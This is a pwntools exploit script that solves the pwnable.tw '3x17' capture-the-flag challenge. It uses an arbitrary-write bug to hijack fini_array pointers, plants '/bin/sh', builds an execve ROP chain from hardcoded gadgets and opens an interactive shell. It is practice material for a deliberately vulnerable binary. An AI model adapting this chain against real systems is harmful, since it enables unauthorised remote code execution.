#!/usr/bin/env python3

from pwn import *

QWORD = 8
DUMMY = 0xdeadbeef
SHELL64 = u64(b"/bin/sh\x00".ljust(8, b"\x00"))

elf = ELF("./given/3x17")
context.arch = "amd64"

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10105)
    else:
        p = process([elf.path])
        if args.D:
            gdb.attach(p, """
                    b *0x474fbe
                    """)
    return p

def arbit_write(addr, values, p):
    """
    The main function of this challenge is perform an arbitrary write on
    "dword" address,
    """
    p.recvuntil(b"addr:")
    p.sendline(str(addr).encode('ascii') + b"\x00")

    val_bytes = b"".join([p64(v) for v in values])
    assert(len(val_bytes) <= 24 and len(val_bytes) % 8 == 0)
    p.recvuntil(b"data:")
    p.send(val_bytes)

def arbit_write_make_repeat(p):
    """
    This challenge is about finding the data_func_ptrs
    I set a breakpoint at main's return address and
    manually stepi to find it

    """
    data_func_ptrs = 0x4b40f0
    func_func_ptrs_caller = 0x402960
    func_main = 0x401b6d
    arbit_write(data_func_ptrs,
                [func_func_ptrs_caller, func_main],
                p)

def arbit_write_cancel_repeat(p):
    data_func_ptrs = 0x4b40f0
    ret = 0x442113
    arbit_write(data_func_ptrs,
                [ret, ret, 1],
                p)

def arbit_write_rop_chain(addr, rop_chain, p):
    padded_len = len(rop_chain) + (24 - len(rop_chain) % 24)
    rop_chain = rop_chain.ljust(padded_len, b"\x00")
    print(len(rop_chain))
    for i in range(0, len(rop_chain), 24):
        a = u64(rop_chain[i:i+8])
        b = u64(rop_chain[i+8:i+16])
        c = u64(rop_chain[i+16:i+24])
        arbit_write(addr + i, [a, b, c], p)

def exploit():

    p = conn()

    # info: pwndbg/objdump
    data_func_ptrs = 0x4b40f0
    data_buf_for_shell = data_func_ptrs - QWORD

    # ROPgadget
    rop_rax = 0x41e4af
    rop_rdi = 0x401696
    rop_rsi_r15 = 0x401694
    rop_rdx = 0x446e35
    rop_syscall = 0x471db5
    rop_leave = 0x474fbe
    ret = 0x442113

    # Do this, so we can perform arbitrary write repeatedly
    arbit_write_make_repeat(p)

    # write /bin/sh
    arbit_write(data_buf_for_shell, [SHELL64], p)

    # Build rop chain at data_func_ptrs + 0x10
    rop_chain = p64(rop_rdx) + p64(0)
    rop_chain += p64(rop_rsi_r15) + p64(0) + p64(DUMMY)
    rop_chain += p64(rop_rdi) + p64(data_buf_for_shell)
    rop_chain += p64(rop_rax) + p64(constants.SYS_execve)
    rop_chain += p64(rop_syscall)
    rop_chain_start = data_func_ptrs + 0x10
    arbit_write_rop_chain(rop_chain_start, rop_chain, p)

    arbit_write(data_func_ptrs,
                [rop_leave, ret], p)
    p.interactive()


if __name__ == "__main__":
    exploit()
